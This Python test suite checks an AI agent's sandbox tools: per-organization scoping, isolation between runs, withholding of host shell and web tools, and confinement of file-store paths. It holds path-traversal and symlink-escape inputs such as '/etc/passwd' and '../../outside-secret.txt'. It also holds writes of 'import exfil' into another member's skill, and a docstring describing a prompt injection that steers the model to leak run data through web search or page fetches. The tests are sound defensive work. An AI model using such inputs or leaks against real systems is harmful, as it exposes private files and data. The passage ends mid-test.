"""WS43-F21 — projects-assistant's sandbox tools (D86, §16.3).

Spec ``project-docs/specs/maf_coding_engine.md`` §16.3, §7.4 and §10
WS43-F21, and the narrowed done-when 1 to 3 and 5 of WS-43d.

What breaks this fence: the projects-assistant factory gives the sandbox
tools to an organization that the scope does not name, attaches them to a
shared agent object, or gives back ``code_task``, ``run_script`` or
``install_dependency`` when ``covers()`` is true. The suite also pins:

* an empty scope changes nothing: the agent, its tools and its instructions
  are byte-identical to the factory without this slice;
* the tools are per run, with no leak between two runs at once;
* the file tools map ``outputs/`` to the thread's own folder and ``.run/`` to
  the run data, refuse escapes and links, hold the lock, call ``decide()``
  with the real host path, and mirror each kept write and delete;
* every boundary holds in ``AGENT_PERMISSION_MODE=audit``, where ``decide()``
  approves everything;
* a skill written under ``agent-data/skills/`` lists on the next turn, and
  its script runs in the sandbox through its ``/workspace`` path.

⚠️ D85 (PR #598) is not on this branch yet. ``covers()`` needs its seam
(``_tool_injection._withheld_shell_tools``), so the ``sandbox`` fixture
stands in for it. ``test_with_no_d85_seam_no_org_is_covered`` runs WITHOUT
the stand-in and shows that main covers nobody today.

Mutations this suite catches (R7), each run red once by hand:

* ``attach_for_run`` appends the provider to ``agent.context_providers``: the
  shared-object test;
* ``covers()`` drops the scope check: the org B test;
* ``_layout`` drops the host-shell check: the host-shell tests;
* ``_run_in_sandbox`` drops its ``covers()`` check: the audit-mode test;
* ``TenantFileStore._place`` maps ``outputs/`` to the shared folder: the map
  test and the other-thread test;
* ``TenantFileStore._decide`` passes the tool path: the decide test.

Fix round 1 of PR #603 (each run red once by hand on 2026-10-03):

* ``_place`` takes any head, or a part that starts with a dot: the four-heads
  test;
* the store ignores the skill author: the skill-belongs test;
* the skills source lists every author: the own-skills test;
* the script runner runs any skill: the skill-script test;
* the withhold middleware is not added: the covered-run test, which reads
  the REAL request bodies through the executor;
* the steer wrap of the provider tools is removed: the steer test.

The P3 review (each run red once by hand on 2026-10-04):

* ``HOST_NETWORK_TOOLS`` taken out of ``WITHHELD_HOST_TOOLS``: the web-tools
  test, which reads the REAL request bodies and traps every real HTTP send
  of the host.
"""
from __future__ import annotations

import asyncio
import os
from pathlib import Path
from typing import Any

import pytest
from acb_skills import sandbox_tools as st
from acb_skills.tenant_file_store import TenantFileStore
from orchestrator import sandbox_broker as sb

from tests.unit._projects_agent_fakes import load_agent_module
from tests.unit._sandbox_broker_fakes import bound_run
from tests.unit._sandbox_tools_fakes import (  # noqa: F401 — fixtures by name
    ORG_A,
    ORG_B,
    PA,
    host_trap,
    new_thread,
    sandbox,
    short_tmp,
)

pytest.importorskip("agent_framework", reason="MAF not installed")
pytest.importorskip("skill_projects", reason="skill-projects not installed")

_M = load_agent_module("projects_assistant_sandbox_suite")
_HOST_SHELL = {"code_task", "run_script", "install_dependency"}
_FILE_TOOLS = {
    "file_access_read", "file_access_read_lines", "file_access_ls", "file_access_grep",
    "file_access_write", "file_access_delete", "file_access_replace",
    "file_access_replace_lines",
}


def _providers(agent: Any) -> list[Any]:
    return [p for p in agent.context_providers if isinstance(p, st.ProjectsSandboxProvider)]


def _build(org: str, thread: str) -> Any:
    with bound_run(org, agent=PA, thread=thread):
        return _M.build_agents()[0]


def _tool_name(tool: Any) -> str:
    return getattr(tool, "name", None) or getattr(getattr(tool, "func", tool), "__name__", "")


async def _turn(agent: Any) -> Any:
    """The provider's ``before_run``, as MAF calls it at the start of a turn."""
    from agent_framework import AgentSession, SessionContext

    context = SessionContext(input_messages=[])
    for provider in _providers(agent):
        await provider.before_run(
            agent=agent, session=AgentSession(), context=context, state={},
        )
    return context


def _drop_host_shell(agent: Any) -> None:
    """What the D85 seam does at injection, for a test on this branch."""
    tools = agent.default_options["tools"]
    tools[:] = [t for t in tools if _tool_name(t) not in _HOST_SHELL]


# ── the scope decides, per organization ──────────────────────────────────────


def test_org_a_in_the_scope_gets_the_tools_and_org_b_does_not(sandbox) -> None:  # noqa: F811
    assert len(_providers(_build(ORG_A, new_thread()))) == 1
    assert _providers(_build(ORG_B, new_thread())) == []


def test_a_star_scope_covers_every_organization(sandbox, monkeypatch) -> None:  # noqa: F811
    sandbox.set_scope(monkeypatch, "projects:*")
    assert len(_providers(_build(ORG_B, new_thread()))) == 1


@pytest.mark.parametrize("scope", ["", "code_task:*", f"code_task:{ORG_A},app_builder:*"])
def test_another_target_or_an_empty_scope_gives_no_tools(sandbox, monkeypatch, scope) -> None:  # noqa: F811
    sandbox.set_scope(monkeypatch, scope)
    assert _providers(_build(ORG_A, new_thread())) == []
    assert sb.covers(PA, ORG_A) is False


def test_an_empty_scope_leaves_the_agent_byte_identical(sandbox, monkeypatch) -> None:  # noqa: F811
    """The factory with the attach and without it give one agent, byte for byte."""
    from agent_framework import Agent
    from orchestrator._tool_injection import _inject_agent_tools

    sandbox.set_scope(monkeypatch, "")
    cfg_scope = __import__("json").loads(
        (Path(_M.__file__).parent / "config.json").read_text(encoding="utf-8"),
    )["tool_scope"]
    with bound_run(ORG_A, agent=PA, thread=new_thread()):
        attached = _M.build_agents()
        monkeypatch.setattr(_M, "_for_this_run", lambda agent: agent)
        plain = _M.build_agents()
    for agents in (attached, plain):
        _inject_agent_tools(agents, tool_scope=cfg_scope, agent_name=PA)
    a, p = attached[0], plain[0]
    assert type(a) is Agent and a.context_providers == []
    assert [_tool_name(t) for t in a.default_options["tools"]] == [
        _tool_name(t) for t in p.default_options["tools"]
    ]
    assert a.default_options["instructions"] == p.default_options["instructions"]


def test_attach_returns_the_same_object_when_not_covered(sandbox, monkeypatch) -> None:  # noqa: F811
    sandbox.set_scope(monkeypatch, "")
    marker = object()
    with bound_run(ORG_A, agent=PA, thread=new_thread()):
        assert st.attach_for_run(marker, PA) is marker


# ── covers() under the three conditions of §16.3 ─────────────────────────────


def test_covers_needs_a_healthy_broker(sandbox, monkeypatch) -> None:  # noqa: F811
    assert sb.covers(PA, ORG_A) is True
    sandbox.broker._note_docker(False)
    assert sb.covers(PA, ORG_A) is False
    sandbox.broker._note_docker(True)
    monkeypatch.setattr(sandbox.env["settings"], "sandbox_min_free_disk_mb", 10**12)
    assert sb.covers(PA, ORG_A) is False
    monkeypatch.setattr(sandbox.env["settings"], "sandbox_min_free_disk_mb", 0)
    monkeypatch.setattr(sandbox.env["settings"], "sandbox_image", "")
    assert sb.covers(PA, ORG_A) is False
    monkeypatch.setattr(sandbox.env["settings"], "sandbox_image", "metorite/x:latest")
    assert sb.covers(PA, ORG_A) is False, "a mutable tag cannot start a container"


def test_covers_never_names_star_or_an_empty_org(sandbox) -> None:  # noqa: F811
    assert sb.covers(PA, "*") is False
    assert sb.covers(PA, "") is False
    assert sb.covers("", ORG_A) is False


def test_with_no_d85_seam_no_org_is_covered(sandbox, monkeypatch) -> None:  # noqa: F811
    """§16.3 condition 3, on the real seam check (no stand-in)."""
    import importlib

    from orchestrator import _tool_injection

    real = importlib.reload(sb)._host_shell_withheld
    monkeypatch.setattr(sb, "_BROKER", sandbox.broker)
    has_seam = callable(getattr(_tool_injection, "_withheld_shell_tools", None))
    assert real(PA) is has_seam
    monkeypatch.setattr(sb, "_host_shell_withheld", real)
    assert sb.covers(PA, ORG_A) is has_seam


def test_a_true_cover_never_lifts_the_host_shell_block(sandbox) -> None:  # noqa: F811
    assert sb.covers(PA, ORG_A) is True
    assert sb.lifts_shell_block(PA, ORG_A) is False
    for agent in ("agent-x", "app-builder"):
        assert sb.lifts_shell_block(agent, ORG_A) is False  # WS-43f is not built


# ── per run, never on a shared object ────────────────────────────────────────


def test_the_tools_join_a_view_never_the_shared_agent(sandbox) -> None:  # noqa: F811
    from agent_framework import Agent

    with bound_run(ORG_A, agent=PA, thread=new_thread()):
        base = Agent(client=_M.build_agents()[0].client, name=PA, tools=[])
        view = st.attach_for_run(base, PA)
    assert view is not base
    assert base.context_providers == [], "the provider was added to the shared object"
    assert len(_providers(view)) == 1


async def test_two_runs_at_once_never_share_tools(sandbox) -> None:  # noqa: F811
    """Org A thread 1, org A thread 2 and org B, in three concurrent tasks."""
    t1, t2, t3 = new_thread(), new_thread(), new_thread()

    async def run(org: str, thread: str) -> tuple[Any, set[str], Path]:
        with bound_run(org, agent=PA, thread=thread) as ws:
            agent = _M.build_agents()[0]
            _drop_host_shell(agent)
            await asyncio.sleep(0)
            context = await _turn(agent)
            names = {_tool_name(t) for t in context.tools}
            write = next((t for t in context.tools if _tool_name(t) == "file_access_write"), None)
            if write is not None:
                await write.func(file_name="outputs/mine.txt", content=thread, overwrite=True)
            return agent, names, ws

    (a1, n1, ws1), (a2, n2, ws2), (_a3, n3, _ws3) = await asyncio.gather(
        run(ORG_A, t1), run(ORG_A, t2), run(ORG_B, t3),
    )
    assert "run_command" in n1 and "run_command" in n2
    assert n3 == set(), "org B, outside the scope, got a sandbox tool"
    assert _providers(a1)[0] is not _providers(a2)[0]
    from acb_skills.agent_paths import thread_slug

    assert (ws1 / "outputs" / thread_slug(t1) / "mine.txt").read_text() == t1
    assert (ws2 / "outputs" / thread_slug(t2) / "mine.txt").read_text() == t2


# ── what a covered turn holds, and what it never holds ───────────────────────


async def test_a_covered_turn_gets_run_command_and_the_eight_file_tools(sandbox) -> None:  # noqa: F811
    agent = _build(ORG_A, thread := new_thread())
    _drop_host_shell(agent)
    with bound_run(ORG_A, agent=PA, thread=thread):
        context = await _turn(agent)
    names = {_tool_name(t) for t in context.tools}
    assert {"run_command"} | _FILE_TOOLS <= names
    assert "request_network_access" not in names
    assert not names & _HOST_SHELL


async def test_a_run_that_holds_a_host_shell_tool_gets_nothing(sandbox) -> None:  # noqa: F811
    """§16.3 condition 3, at run time: on this branch the injection still gives
    projects-assistant ``code_task`` and ``run_script`` (no D85 yet), so the
    provider must add no sandbox tool beside them."""
    from orchestrator._tool_injection import _inject_agent_tools

    thread = new_thread()
    with bound_run(ORG_A, agent=PA, thread=thread):
        agents = _M.build_agents()
        _inject_agent_tools(agents, tool_scope=["write_artifact"], agent_name=PA)
        held = {_tool_name(t) for t in agents[0].default_options["tools"]}
        context = await _turn(agents[0])
    if held & _HOST_SHELL:
        assert context.tools == [], "a sandbox tool sat beside a host shell tool"
    names = {_tool_name(t) for t in context.tools} | held
    assert not ({"run_command"} <= names and names & _HOST_SHELL)


async def test_with_the_host_shell_withheld_the_turn_holds_none_of_the_three(sandbox) -> None:  # noqa: F811
    """The D85 seam, stood in for: the final tool set of a covered run holds the
    sandbox tools and none of ``code_task``, ``run_script``, ``install_dependency``."""
    from orchestrator._tool_injection import _inject_agent_tools

    thread = new_thread()
    with bound_run(ORG_A, agent=PA, thread=thread):
        agents = _M.build_agents()
        _inject_agent_tools(agents, tool_scope=["write_artifact"], agent_name=PA)
        _drop_host_shell(agents[0])
        context = await _turn(agents[0])
    final = {_tool_name(t) for t in agents[0].default_options["tools"]}
    final |= {_tool_name(t) for t in context.tools}
    assert "run_command" in final
    assert not final & _HOST_SHELL


async def test_a_scope_flipped_off_after_the_build_ends_the_tools(sandbox, monkeypatch) -> None:  # noqa: F811
    thread = new_thread()
    agent = _build(ORG_A, thread)
    _drop_host_shell(agent)
    sandbox.set_scope(monkeypatch, "")
    with bound_run(ORG_A, agent=PA, thread=thread):
        context = await _turn(agent)
    assert context.tools == []


# ── every boundary holds in audit mode ───────────────────────────────────────


async def test_audit_mode_moves_no_boundary(sandbox, host_trap, monkeypatch) -> None:  # noqa: F811
    """``audit`` approves every ``decide()``. The boundaries are structural:

    an org outside the scope gets no tool and runs nothing, a broker failure
    runs nothing on the host, and the store refuses an escape and a link.
    """
    monkeypatch.setenv("AGENT_PERMISSION_MODE", "audit")
    # 1. An organization outside the scope.
    assert _providers(_build(ORG_B, new_thread())) == []
    with bound_run(ORG_B, agent=PA, thread=new_thread()):
        refused = await st.run_command("echo leak")
    assert "does not cover" in refused and sandbox.docker.calls == []
    # 2. A broker that fails.
    sandbox.docker.fail_run = True
    with bound_run(ORG_A, agent=PA, thread=new_thread()):
        failed = await st.run_command("echo hi")
    assert "Nothing ran on the host" in failed
    assert sandbox.docker.command_execs() == [] and host_trap == []
    # 3. An escape and a link, through the store.
    store, ws, _rd = _store(sandbox)
    outside = ws.parent.parent / "outside-secret.txt"
    outside.write_text("HOST", encoding="utf-8")
    for bad in ("../../outside-secret.txt", ".git/config", "/etc/passwd"):
        with pytest.raises(ValueError):
            await store.write(bad, "x")
    os.symlink(outside, ws / "agent-data" / "leak.txt")
    with pytest.raises(ValueError):
        await store.read("agent-data/leak.txt")
    with pytest.raises(ValueError):
        await store.write("agent-data/leak.txt", "OVERWRITTEN")
    assert outside.read_text(encoding="utf-8") == "HOST"


# ── the file tools: the map, the lock, decide() and the mirror ───────────────


class _Guard:
    def __init__(self) -> None:
        self.held = 0
        self.inside = False
        self.prepared = 0
        self.refuse_writes = False

    def hold(self) -> Any:
        guard = self

        class _Hold:
            async def __aenter__(self) -> None:
                guard.held += 1
                guard.inside = True

            async def __aexit__(self, *exc: Any) -> None:
                guard.inside = False

        return _Hold()

    async def prepare(self) -> None:
        self.prepared += 1

    def writes_refused(self) -> bool:
        return self.refuse_writes


def _store(
    box: Any, thread: str | None = None, member: str = "member@example.com",
) -> tuple[TenantFileStore, Path, Path]:
    from acb_skills.agent_paths import ensure_state_dir, tenant_instance, thread_slug

    thread = thread or new_thread()
    ws = ensure_state_dir(PA, tenant_instance(ORG_A)).resolve()
    (ws / "agent-data").mkdir(exist_ok=True)
    (ws / "outputs" / thread_slug(thread)).mkdir(parents=True, exist_ok=True)
    run_data = box.env["clone"].resolve() / "state" / ".run-data" / "o" / thread_slug(thread)
    run_data.mkdir(parents=True, exist_ok=True)
    store = TenantFileStore(
        workspace=ws, outputs_rel=f"outputs/{thread_slug(thread)}",
        run_data=run_data, guard=_Guard(), member=member,
    )
    return store, ws, run_data


async def test_the_map_outputs_run_data_and_kept_folders(sandbox) -> None:  # noqa: F811
    from acb_skills.agent_paths import thread_slug

    thread = new_thread()
    store, ws, run_data = _store(sandbox, thread)
    with bound_run(ORG_A, agent=PA, thread=thread):
        await store.write("outputs/chart.svg", "<svg/>")
        await store.write(".run/rows.csv", "a,b")
        await store.write("agent-data/notes.md", "n")
    slug = thread_slug(thread)
    assert (ws / "outputs" / slug / "chart.svg").read_text() == "<svg/>"
    assert not (ws / "outputs" / "chart.svg").exists(), "it wrote the shared outputs/"
    assert (run_data / "rows.csv").read_text() == "a,b"
    assert not (ws / ".run" / "rows.csv").exists()
    assert (ws / "agent-data" / "notes.md").read_text() == "n"
    kept = [rel for rel, _ in sandbox.mirrored]
    assert kept == [f"outputs/{slug}/chart.svg", "agent-data/notes.md"]
    assert sandbox.cards == [f"outputs/{slug}/chart.svg"]
    assert store._guard.held == 3 and store._guard.prepared == 2


async def test_no_path_reaches_another_threads_folder(sandbox) -> None:  # noqa: F811
    from acb_skills.agent_paths import thread_slug

    mine, other = new_thread(), new_thread()
    store, ws, _ = _store(sandbox, mine)
    (ws / "outputs" / thread_slug(other)).mkdir(parents=True)
    (ws / "outputs" / thread_slug(other) / "theirs.txt").write_text("PRIVATE")
    with bound_run(ORG_A, agent=PA, thread=mine):
        assert await store.read(f"outputs/{thread_slug(other)}/theirs.txt") is None
        names = [e.name for e in await store.list_children("outputs")]
        await store.write(f"outputs/{thread_slug(other)}/planted.txt", "x")
    assert thread_slug(other) not in names
    assert not (ws / "outputs" / thread_slug(other) / "planted.txt").exists()
    assert (ws / "outputs" / thread_slug(mine) / thread_slug(other) / "planted.txt").exists()


async def test_the_root_listing_shows_run_and_hides_host_entries(sandbox) -> None:  # noqa: F811
    store, ws, _ = _store(sandbox)
    (ws / ".git").mkdir(exist_ok=True)
    names = {e.name for e in await store.list_children("")}
    assert ".run" in names and "agent-data" in names
    assert ".git" not in names and ".cc-instance" not in names


async def test_a_delete_mirrors_and_still_works_over_the_quota(sandbox) -> None:  # noqa: F811
    from acb_skills.agent_paths import thread_slug

    thread = new_thread()
    store, ws, _ = _store(sandbox, thread)
    with bound_run(ORG_A, agent=PA, thread=thread):
        await store.write("outputs/big.txt", "x")
        store._guard.refuse_writes = True
        with pytest.raises(ValueError, match="quota"):
            await store.write("outputs/more.txt", "y")
        assert await store.delete("outputs/big.txt") is True
    assert sandbox.deleted == [f"outputs/{thread_slug(thread)}/big.txt"]
    assert not (ws / "outputs" / thread_slug(thread) / "more.txt").exists()


async def test_decide_sees_the_real_host_path(sandbox, monkeypatch) -> None:  # noqa: F811
    from acb_skills import permission_policy
    from acb_skills.agent_paths import thread_slug
    from acb_skills.write_artifact import artifact_context

    seen: list[tuple[dict[str, Any], str]] = []

    def spy(request: dict[str, Any]) -> tuple[bool, str, str]:
        seen.append((dict(request), str(artifact_context().get("permission_check_root"))))
        return True, "write_in_workspace", ""

    monkeypatch.setattr(permission_policy, "decide", spy)
    thread = new_thread()
    store, ws, run_data = _store(sandbox, thread)
    with bound_run(ORG_A, agent=PA, thread=thread):
        await store.write("outputs/a.txt", "a")
        await store.write(".run/b.csv", "b")
        await store.delete("outputs/a.txt")
    paths = [(r["tool_name"], r["path"], root) for r, root in seen]
    assert paths == [
        ("file_access_write", str(ws / "outputs" / thread_slug(thread) / "a.txt"), str(ws)),
        ("file_access_write", str(run_data / "b.csv"), str(run_data)),
        ("file_access_delete", str(ws / "outputs" / thread_slug(thread) / "a.txt"), str(ws)),
    ]


async def test_an_enforced_refusal_writes_nothing_and_audit_only_logs(sandbox, monkeypatch) -> None:  # noqa: F811
    from acb_skills import permission_policy

    monkeypatch.setattr(permission_policy, "decide", lambda r: (False, "write_out_of_workspace", ""))
    thread = new_thread()
    store, ws, _ = _store(sandbox, thread)
    with bound_run(ORG_A, agent=PA, thread=thread):
        monkeypatch.setenv("AGENT_PERMISSION_MODE", "enforce")
        with pytest.raises(ValueError, match="blocked by permission policy"):
            await store.write("agent-data/x.md", "x")
        assert not (ws / "agent-data" / "x.md").exists()
        monkeypatch.setenv("AGENT_PERMISSION_MODE", "audit")
        await store.write("agent-data/x.md", "x")
    assert (ws / "agent-data" / "x.md").read_text() == "x"


# ── skills (done-when 7) ─────────────────────────────────────────────────────

_SKILL = """---
name: {name}
description: Draw a chart from a CSV file.
---
Run scripts/plot.py with the CSV path.
"""


async def test_a_skill_written_now_lists_on_the_next_turn(sandbox) -> None:  # noqa: F811
    from agent_framework import AgentSession, SkillsSourceContext

    thread = new_thread()
    store, ws, _ = _store(sandbox, thread)
    with bound_run(ORG_A, agent=PA, thread=thread):
        guard = st._BrokerGuard(sandbox.broker, sb.read_run_binding())
        source = st.LockedSkillsSource(ws, guard, "member@example.com")
        ctx = SkillsSourceContext(agent=None, session=AgentSession())
        assert await source.get_skills(ctx) == []
        await store.write("agent-data/skills/chart/SKILL.md", _SKILL.format(name="chart"))
        await store.write("agent-data/skills/chart/scripts/plot.py", "print(1)")
        first = await source.get_skills(ctx)
        await store.write("agent-data/skills/table/SKILL.md", _SKILL.format(name="table"))
        second = await source.get_skills(ctx)
    assert [s.frontmatter.name for s in first] == ["chart"]
    assert sorted(s.frontmatter.name for s in second) == ["chart", "table"]
    assert ("agent-data/skills/chart/SKILL.md" in [r for r, _ in sandbox.mirrored])


async def test_a_linked_skills_dir_lists_nothing(sandbox, short_tmp) -> None:  # noqa: F811
    from agent_framework import AgentSession, SkillsSourceContext

    thread = new_thread()
    _unused, ws, _ = _store(sandbox, thread)
    elsewhere = short_tmp / "host-skills" / "evil"
    elsewhere.mkdir(parents=True)
    (elsewhere / "SKILL.md").write_text(_SKILL.format(name="evil"))
    os.symlink(short_tmp / "host-skills", ws / "agent-data" / "skills", target_is_directory=True)
    with bound_run(ORG_A, agent=PA, thread=thread):
        source = st.LockedSkillsSource(
            ws, st._BrokerGuard(sandbox.broker, sb.read_run_binding()), "member@example.com",
        )
        assert await source.get_skills(SkillsSourceContext(agent=None, session=AgentSession())) == []


async def test_a_skill_script_runs_in_the_sandbox_through_its_workspace_path(
    sandbox, host_trap,  # noqa: F811
) -> None:
    import types

    thread = new_thread()
    with bound_run(ORG_A, agent=PA, thread=thread) as ws:
        script_path = ws.resolve() / "agent-data" / "skills" / "chart" / "scripts" / "plot.py"
        script_path.parent.mkdir(parents=True)
        script_path.write_text("print(1)")
        (script_path.parents[1] / ".metorite-author").write_text("member@example.com")
        runner = st.SandboxScriptRunner(ws, "member@example.com")
        script = types.SimpleNamespace(full_path=str(script_path), name="scripts/plot.py")
        out = await runner(None, script, {"csv": "/workspace/.run/rows.csv"})
        outside = types.SimpleNamespace(full_path=str(ws / "agent-data" / "x.py"), name="x.py")
        refused = await runner(None, outside, None)
    assert "exit 0" in out
    command = sandbox.docker.command_execs()[0][-1]
    assert command == (
        "python3 /workspace/agent-data/skills/chart/scripts/plot.py --csv /workspace/.run/rows.csv"
    )
    assert "refused" in refused and len(sandbox.docker.command_execs()) == 1
    assert host_trap == []


# ══════════════ fix round 1: shared code, host tools and the steer ══════════

_X, _Y = "x-member@example.com", "y-member@example.com"


@pytest.mark.parametrize("bad", [
    "pandas.py", "sitecustomize.py", "scripts/run.py", ".git/config", ".cc-instance",
    "agent-data/.metorite-author", "agent-data/skills/s/.metorite-author",
    "agent-data/x/.hidden", "inputs/.bashrc", "outputs/.pth",
])
async def test_the_store_refuses_every_path_outside_the_four_heads(sandbox, bad) -> None:  # noqa: F811
    store, ws, _ = _store(sandbox)
    before = (ws / bad).read_bytes() if (ws / bad).is_file() else None
    with pytest.raises(ValueError):
        await store.write(bad, "import os")
    after = (ws / bad).read_bytes() if (ws / bad).is_file() else None
    assert after == before, "a refused path was written"


async def test_the_root_listing_is_the_four_heads_and_nothing_else(sandbox) -> None:  # noqa: F811
    store, ws, _ = _store(sandbox)
    (ws / "inputs").mkdir(exist_ok=True)
    (ws / "planted.py").write_text("x")
    (ws / "elsewhere").mkdir()
    names = {e.name for e in await store.list_children("")}
    assert names == {".run", "agent-data", "inputs", "outputs"}


async def test_a_skill_belongs_to_the_member_who_made_it(sandbox) -> None:  # noqa: F811
    """X makes a skill. Y's run cannot read, list, change or delete it."""
    thread = new_thread()
    x_store, ws, _ = _store(sandbox, thread, member=_X)
    y_store, _ws, _ = _store(sandbox, thread, member=_Y)
    await x_store.write("agent-data/skills/chart/SKILL.md", _SKILL.format(name="chart"))
    await x_store.write("agent-data/skills/chart/scripts/plot.py", "print(1)")
    marker = ws / "agent-data" / "skills" / "chart" / ".metorite-author"
    assert marker.read_text() == _X
    assert ("agent-data/skills/chart/.metorite-author", _X.encode()) in sandbox.mirrored
    for call in (
        y_store.read("agent-data/skills/chart/SKILL.md"),
        y_store.list_children("agent-data/skills/chart"),
        y_store.write("agent-data/skills/chart/scripts/plot.py", "import exfil"),
        y_store.delete("agent-data/skills/chart/scripts/plot.py"),
    ):
        with pytest.raises(ValueError, match="another member"):
            await call
    assert await y_store.file_exists("agent-data/skills/chart/SKILL.md") is False
    assert [e.name for e in await y_store.list_children("agent-data/skills")] == []
    assert [e.name for e in await x_store.list_children("agent-data/skills")] == ["chart"]
    assert (ws / "agent-data/skills/chart/scripts/plot.py").read_text() == "print(1)"


async def test_only_the_members_own_skills_reach_the_prompt(sandbox) -> None:  # noqa: F811
    from agent_framework import AgentSession, SkillsSourceContext

    thread = new_thread()
    x_store, ws, _ = _store(sandbox, thread, member=_X)
    await x_store.write("agent-data/skills/xs/SKILL.md", _SKILL.format(name="xs"))
    y_store, _ws, _ = _store(sandbox, thread, member=_Y)
    await y_store.write("agent-data/skills/ys/SKILL.md", _SKILL.format(name="ys"))
    ctx = SkillsSourceContext(agent=None, session=AgentSession())
    with bound_run(ORG_A, agent=PA, thread=thread):
        guard = st._BrokerGuard(sandbox.broker, sb.read_run_binding())
        for member, expect in ((_X, ["xs"]), (_Y, ["ys"]), ("", [])):
            got = await st.LockedSkillsSource(ws, guard, member).get_skills(ctx)
            assert [s.frontmatter.name for s in got] == expect, member


async def test_a_member_never_runs_another_members_skill_script(sandbox, host_trap) -> None:  # noqa: F811
    import types

    thread = new_thread()
    x_store, ws, _ = _store(sandbox, thread, member=_X)
    await x_store.write("agent-data/skills/chart/scripts/plot.py", "print(1)")
    script = types.SimpleNamespace(
        full_path=str(ws / "agent-data/skills/chart/scripts/plot.py"), name="scripts/plot.py",
    )
    with bound_run(ORG_A, agent=PA, thread=thread, member=_Y) as bws:
        refused = await st.SandboxScriptRunner(bws, _Y)(None, script, None)
    with bound_run(ORG_A, agent=PA, thread=thread, member=_X) as bws:
        ran = await st.SandboxScriptRunner(bws, _X)(None, script, None)
    assert "only the member who made a skill" in refused
    assert "exit 0" in ran
    assert len(sandbox.docker.command_execs()) == 1 and host_trap == []


def test_the_withheld_names_are_the_host_floor_tools_that_open_the_dir() -> None:
    from orchestrator import _tool_injection as ti

    assert {"web_search", "fetch_page"} == st.HOST_NETWORK_TOOLS
    assert {
        "write_artifact", "share_artifact", "save_note", "recall_notes",
        "get_errors", "run_diagnostics", "web_search", "fetch_page",
    } == st.WITHHELD_HOST_TOOLS
    # Each one is on the core floor, so every agent holds it. That is why a
    # covered run must take it out.
    assert st.WITHHELD_HOST_TOOLS <= ti._CORE_STANDARD_TOOL_NAMES


async def test_the_middleware_hides_and_refuses_the_withheld_tools() -> None:
    import types

    tools = [types.SimpleNamespace(name=n) for n in ("write_artifact", "file_access_write", "save_note")]
    ctx = types.SimpleNamespace(options={"tools": tools, "model": "m"})
    seen: list[Any] = []

    async def nxt() -> None:
        seen.append([t.name for t in ctx.options["tools"]])

    await st.WithholdHostTools().process(ctx, nxt)
    assert seen == [["file_access_write"]]
    assert [t.name for t in tools] == ["write_artifact", "file_access_write", "save_note"]
    call = types.SimpleNamespace(function=types.SimpleNamespace(name="get_errors"), result=None)
    ran: list[str] = []

    async def go() -> None:
        ran.append("ran")

    await st.RefuseHostTools().process(call, go)
    assert ran == [] and "off in this chat" in call.result
    web = types.SimpleNamespace(function=types.SimpleNamespace(name="fetch_page"), result=None)
    await st.RefuseHostTools().process(web, go)
    assert ran == [] and "no web access" in web.result


def _covered_run(monkeypatch, sandbox, turns, *, on_request=None) -> Any:  # noqa: F811
    """projects-assistant through the REAL executor, covered for ORG_A.

    The D85 seam is not on this branch, so the injection here leaves out
    the three host shell tools, as D85 does.
    """
    import json
    import shutil

    import httpx
    from acb_common.db import bind_tenant, release_tenant
    from orchestrator import _tool_injection as ti
    from orchestrator import executor

    from tests.unit._native_maf_harness import ScriptedModel, parse_frames

    real = ti._collect_injectable_platform_tools
    monkeypatch.setattr(ti, "_collect_injectable_platform_tools", lambda: [
        fn for fn in real() if fn.__name__ not in _HOST_SHELL
    ])
    # The loader clones an agent as its NAME (``clone_as=agent_name``), so
    # the dir of this run is named ``projects-assistant``, as in production.
    source = Path(_M.__file__).parent
    agent_dir = sandbox.env["clone"] / "repos" / PA
    agent_dir.mkdir(parents=True, exist_ok=True)
    shutil.copy(source / "config.json", agent_dir / "config.json")
    config = json.loads((agent_dir / "config.json").read_text(encoding="utf-8"))
    model = ScriptedModel(turns, on_request=on_request)

    def build() -> list[Any]:
        agents = _M.build_agents()
        oc = agents[0].client.client
        oc._client = httpx.AsyncClient(
            transport=httpx.MockTransport(model), event_hooks=oc._client.event_hooks,
        )
        return agents

    class _Loaded:
        def __init__(self) -> None:
            self.agent_dir, self.agent_name, self.config = agent_dir, PA, config

        def build_agents(self) -> list[Any]:
            return build()

    class _Ctx:
        def __enter__(self) -> _Loaded:
            return _Loaded()

        def __exit__(self, *_a: Any) -> bool:
            return False

    import gateway.routes.agent as routes_agent

    monkeypatch.setattr(executor, "load_agent", lambda *a, **k: _Ctx())
    monkeypatch.setattr(executor, "build_integrations", lambda *a, **k: ({}, {}))
    monkeypatch.setattr(routes_agent, "_load_dynamic_agents", lambda: [])

    async def collect() -> list[str]:
        return [line async for line in executor.run_agent_stream(
            PA, {"message": "hi", "user_email": "member@example.com"},
            run_id="run-covered", thread_id=new_thread(),
        )]

    token = bind_tenant(ORG_A)
    try:
        events = parse_frames(asyncio.run(collect()))
    finally:
        release_tenant(token)
    return model, events, None


def _request_tools(body: dict[str, Any]) -> set[str]:
    return {t["function"]["name"] for t in body.get("tools") or []}


def _tool_results(body: dict[str, Any]) -> list[str]:
    return [str(m.get("content")) for m in body.get("messages") or [] if m.get("role") == "tool"]


def test_a_covered_run_never_offers_or_runs_a_withheld_host_tool(sandbox, monkeypatch) -> None:  # noqa: F811
    """The real request bodies: the six host tools are not offered, and a call
    that names one anyway is refused before it touches the dir."""
    from tests.unit._native_maf_harness import text_turn, tool_turn

    model, _events, _built = _covered_run(monkeypatch, sandbox, [
        tool_turn("write_artifact", '{"path": "outputs/x.md", "content": "x"}'),
        text_turn("done"),
    ])
    offered = _request_tools(model.bodies[0])
    assert {"run_command", "file_access_write", "file_access_read"} <= offered
    assert not offered & st.WITHHELD_HOST_TOOLS, offered & st.WITHHELD_HOST_TOOLS
    assert not offered & _HOST_SHELL
    assert any("off in this chat" in r for r in _tool_results(model.bodies[1]))
    assert sandbox.mirrored == [] and sandbox.cards == []


def test_a_covered_run_has_no_web_tool_so_no_data_leaves_the_platform(sandbox, monkeypatch) -> None:  # noqa: F811
    """The P3 review: ``web_search`` and ``fetch_page`` run on the HOST, with
    its network. A model that an injection steers could put the rows of
    ``.run/`` in a URL or a query. A covered run is offered neither, and a
    call that names one anyway sends nothing: every real HTTP send of the
    host is trapped. The model's own client uses a mock transport."""
    import httpx

    from tests.unit._native_maf_harness import text_turn, tool_turn

    sent: list[str] = []

    async def trap(self: Any, request: Any) -> Any:
        sent.append(str(request.url))
        raise AssertionError(f"the host sent {request.url}")

    monkeypatch.setattr(httpx.AsyncHTTPTransport, "handle_async_request", trap)
    # The free search engines do not use httpx. With no module, a search
    # that runs answers with an error and sends nothing.
    import sys

